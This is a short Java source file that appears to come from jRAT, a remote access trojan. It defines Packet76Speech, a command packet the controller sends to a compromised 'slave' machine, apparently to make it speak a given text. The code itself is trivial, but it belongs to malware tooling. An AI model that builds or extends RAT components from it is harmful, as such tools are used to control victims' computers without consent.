package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet76Speech extends AbstractOutgoingPacket {

	private String text;

	public Packet76Speech(String text) {
		this.text = text;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(text);
	}

	@Override
	public byte getPacketId() {
		return 76;
	}

}
